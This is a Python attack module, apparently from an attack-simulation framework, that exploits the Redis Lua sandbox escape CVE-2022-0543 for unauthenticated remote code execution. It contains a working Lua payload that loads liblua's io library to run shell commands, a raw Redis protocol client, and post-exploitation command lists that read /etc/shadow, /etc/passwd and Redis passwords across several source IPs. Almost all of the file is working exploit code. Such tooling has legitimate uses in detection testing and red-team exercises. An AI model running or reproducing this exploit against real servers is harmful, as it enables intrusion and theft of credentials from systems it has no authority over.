"""Redis Lua sandbox escape (CVE-2022-0543) exploitation module.

Exploits a Debian-specific vulnerability where Redis's dynamically-linked
Lua 5.1 library allows sandbox escape via ``package.loadlib()``, enabling
unauthenticated remote code execution.  CVSS 10.0.

Three-stage attack:
1. Enumeration — fingerprint Redis (INFO, CONFIG GET, DBSIZE, CLIENT LIST)
2. Exploitation — Lua sandbox escape via EVAL + package.loadlib
3. Post-exploitation — execute system commands via repeated EVAL calls
"""

from __future__ import annotations

import logging
import random
import socket
import time
from datetime import datetime, timezone

from attacks.config import PhaseConfig
from attacks.modules.base import AttackModule, AttackModuleRegistry, AttackResult, TimingProfile

# ── RESP Protocol Helpers ────────────────────────────────────────────

LUA_ESCAPE_TEMPLATE = (
    'local io_l = package.loadlib('
    '"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); '
    "local io = io_l(); "
    'local f = io.popen("{cmd}", "r"); '
    'local res = f:read("*a"); '
    "f:close(); "
    "return res"
)


def _resp_encode(*args: str) -> bytes:
    """Encode a Redis command as a RESP array of bulk strings."""
    parts = [f"*{len(args)}\r\n"]
    for arg in args:
        encoded = arg.encode()
        parts.append(f"${len(encoded)}\r\n")
        parts.append(encoded.decode("latin-1"))
        parts.append("\r\n")
    return "".join(parts).encode("latin-1")


def _resp_read(sock: socket.socket) -> str:
    """Read a single RESP response from a socket.

    Handles simple strings (+), errors (-), integers (:),
    bulk strings ($), and arrays (*) at a basic level.
    """
    buf = b""
    while b"\r\n" not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            return ""
        buf += chunk

    prefix = chr(buf[0])

    if prefix in ("+", "-", ":"):
        # Simple string, error, or integer — single line
        return buf[1:buf.index(b"\r\n")].decode(errors="replace")

    if prefix == "$":
        # Bulk string — $<length>\r\n<data>\r\n
        header_end = buf.index(b"\r\n")
        length = int(buf[1:header_end])
        if length == -1:
            return "(nil)"
        data_start = header_end + 2
        # May need to read more data
        while len(buf) < data_start + length + 2:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
        return buf[data_start:data_start + length].decode(errors="replace")

    if prefix == "*":
        # Array — read all remaining data and return as string
        # For our purposes we just want the text content
        deadline = time.monotonic() + 2.0
        sock.setblocking(False)
        try:
            while time.monotonic() < deadline:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    buf += chunk
                except BlockingIOError:
                    time.sleep(0.05)
        finally:
            sock.setblocking(True)
        return buf.decode(errors="replace")

    return buf.decode(errors="replace")


def _redis_cmd(sock: socket.socket, *args: str) -> str:
    """Send a Redis command and return the response string."""
    sock.sendall(_resp_encode(*args))
    return _resp_read(sock)


# ── Command Profiles ─────────────────────────────────────────────────

COMMAND_PROFILES: dict[str, list[str]] = {
    "system_info": [
        "uname -a",
        "cat /proc/cpuinfo | head -20",
        "cat /proc/meminfo | head -10",
        "df -h",
    ],
    "user_enum": [
        "cat /etc/passwd",
        "cat /etc/shadow",
        "cat /etc/group",
        "last -5",
    ],
    "network_enum": [
        "ip a",
        "ss -tlnp",
        "cat /etc/hosts",
        "cat /etc/resolv.conf",
        "iptables -L -n 2>/dev/null || echo no-perms",
    ],
    "redis_enum": [
        "redis-cli CONFIG GET dir",
        "redis-cli CONFIG GET dbfilename",
        "redis-cli CONFIG GET requirepass",
        "ls -la /var/lib/redis/",
    ],
    "persistence": [
        "cat /etc/crontab",
        "ls -la /etc/cron.d/",
        "ls /tmp/",
        "cat /etc/ssh/sshd_config | grep -i permit",
    ],
    "full_recon": [
        "uname -a",
        "cat /proc/cpuinfo | head -20",
        "cat /proc/meminfo | head -10",
        "df -h",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "cat /etc/group",
        "last -5",
        "ip a",
        "ss -tlnp",
        "cat /etc/hosts",
        "cat /etc/resolv.conf",
        "iptables -L -n 2>/dev/null || echo no-perms",
        "redis-cli CONFIG GET dir",
        "redis-cli CONFIG GET dbfilename",
        "redis-cli CONFIG GET requirepass",
        "ls -la /var/lib/redis/",
        "cat /etc/crontab",
        "ls -la /etc/cron.d/",
        "ls /tmp/",
        "cat /etc/ssh/sshd_config | grep -i permit",
    ],
}

# Enumeration commands run during the fingerprinting stage
ENUM_COMMANDS: list[str] = ["INFO", "CONFIG GET *", "DBSIZE", "CLIENT LIST"]

# First two post-exploit commands are always id/whoami (classic attacker behavior)
POST_EXPLOIT_PREFIX: list[str] = ["id", "whoami"]


@AttackModuleRegistry.register("redis_lua_escape")
class RedisLuaEscapeModule(AttackModule):
    """Redis Lua sandbox escape (CVE-2022-0543) — unauthenticated RCE.

    Connects to an exposed Redis instance on the target, fingerprints it
    via INFO/CONFIG commands, exploits the Debian-specific Lua sandbox
    escape to achieve arbitrary command execution, then runs system
    enumeration commands via repeated EVAL calls.

    Uses raw TCP sockets with the Redis RESP protocol (no external deps).
    Source IP binding via ``sock.bind((src_ip, 0))`` for multi-IP attacks.
    """

    def execute(
        self,
        target: str,
        phase: PhaseConfig,
        ips: list[str],
        rng: random.Random,
        logger: logging.Logger,
    ) -> AttackResult:
        port = phase.params.get("target_port", 6379)
        profile_name = phase.params.get("command_profile", "full_recon")
        explicit_commands = phase.params.get("commands")
        inter_cmd_delay = phase.params.get("inter_command_delay_ms", [500, 3000])
        timing = TimingProfile(phase.timing)
        duration = phase.timing.duration_seconds

        # Resolve post-exploitation command list
        if explicit_commands:
            commands = list(explicit_commands)
        elif profile_name in COMMAND_PROFILES:
            commands = list(COMMAND_PROFILES[profile_name])
        else:
            raise ValueError(
                f"Unknown command_profile {profile_name!r}. "
                f"Available: {sorted(COMMAND_PROFILES.keys())}"
            )

        # Always lead with id/whoami
        commands = POST_EXPLOIT_PREFIX + [c for c in commands if c not in POST_EXPLOIT_PREFIX]

        start_time = datetime.now(timezone.utc)
        deadline = time.monotonic() + duration
        attempts = 0
        successes = 0
        errors: list[str] = []
        commands_executed: list[str] = []
        stages_completed: list[str] = []

        logger.info(
            "Starting Redis Lua escape on %s:%d — profile=%s, %d commands, %d IPs (duration: %ds)",
            target, port, profile_name, len(commands), len(ips), duration,
        )

        for src_ip in ips:
            if time.monotonic() >= deadline:
                logger.info("Duration exceeded, stopping")
                break

            elapsed = time.monotonic() - (deadline - duration)
            progress = min(elapsed / duration, 1.0)

            result = self._run_session(
                target, port, src_ip, commands, inter_cmd_delay,
                rng, logger, deadline, duration,
            )
            attempts += 1

            if result is not None:
                successes += 1
                stages_completed.extend(result["stages"])
                commands_executed.extend(result["commands_executed"])
            else:
                errors.append(f"Session failed from {src_ip}")

            # Apply timing profile delay between sessions
            delay_ms = timing.get_jitter_ms(progress, rng)
            time.sleep(delay_ms / 1000.0)

        end_time = datetime.now(timezone.utc)
        logger.info(
            "Redis Lua escape complete: %d sessions, %d successful, %d commands run",
            attempts, successes, len(commands_executed),
        )

        return AttackResult(
            phase_name=phase.name,
            module_name=self.name,
            start_time=start_time,
            end_time=end_time,
            source_ips=ips,
            attempts=attempts,
            successes=successes,
            errors=errors[:10],
            metadata={
                "command_profile": profile_name,
                "commands": commands,
                "commands_executed": commands_executed,
                "stages_completed": stages_completed,
                "port": port,
            },
        )

    @staticmethod
    def _run_session(
        target: str,
        port: int,
        src_ip: str,
        commands: list[str],
        inter_cmd_delay: list[int],
        rng: random.Random,
        logger: logging.Logger,
        deadline: float,
        duration: float,
    ) -> dict | None:
        """Connect, enumerate, exploit, and run post-exploitation commands.

        Returns dict with stages and commands_executed, or None on failure.
        """
        stages: list[str] = []
        executed: list[str] = []

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.bind((src_ip, 0))
            sock.connect((target, port))
        except OSError as e:
            logger.debug("Connection to %s:%d from %s failed: %s", target, port, src_ip, e)
            return None

        try:
            # ── Stage 1: Enumeration ─────────────────────────────────
            logger.debug("Enumerating Redis on %s:%d from %s", target, port, src_ip)
            for cmd in ENUM_COMMANDS:
                if time.monotonic() >= deadline:
                    break
                parts = cmd.split()
                resp = _redis_cmd(sock, *parts)
                logger.debug("REDIS %s → %d bytes", cmd, len(resp))
                delay_ms = rng.uniform(inter_cmd_delay[0], inter_cmd_delay[1])
                time.sleep(delay_ms / 1000.0)
            stages.append("enumeration")

            if time.monotonic() >= deadline:
                return {"stages": stages, "commands_executed": executed}

            # ── Stage 2: Exploitation (single EVAL) ──────────────────
            logger.debug("Exploiting CVE-2022-0543 from %s", src_ip)
            test_script = LUA_ESCAPE_TEMPLATE.format(cmd="id")
            resp = _redis_cmd(sock, "EVAL", test_script, "0")
            if "uid=" in resp:
                logger.info("Sandbox escape confirmed from %s: %s", src_ip, resp.strip())
                stages.append("exploitation")
                executed.append("id")
            else:
                logger.warning("Sandbox escape failed from %s: %s", src_ip, resp[:100])
                return {"stages": stages, "commands_executed": executed}

            # ── Stage 3: Post-exploitation ───────────────────────────
            logger.debug("Post-exploitation from %s — %d commands", src_ip, len(commands))
            for cmd in commands:
                if time.monotonic() >= deadline:
                    logger.info("Duration exceeded during post-exploitation")
                    break

                # Skip 'id' since we already ran it in stage 2
                if cmd == "id" and "id" in executed:
                    continue

                script = LUA_ESCAPE_TEMPLATE.format(cmd=cmd)
                resp = _redis_cmd(sock, "EVAL", script, "0")
                executed.append(cmd)
                logger.debug("POST-EXPLOIT %s → %d bytes", cmd, len(resp))

                delay_ms = rng.uniform(inter_cmd_delay[0], inter_cmd_delay[1])
                time.sleep(delay_ms / 1000.0)

            stages.append("post_exploitation")
            return {"stages": stages, "commands_executed": executed}

        except OSError as e:
            logger.debug("Redis session error from %s: %s", src_ip, e)
            if stages:
                return {"stages": stages, "commands_executed": executed}
            return None
        finally:
            sock.close()
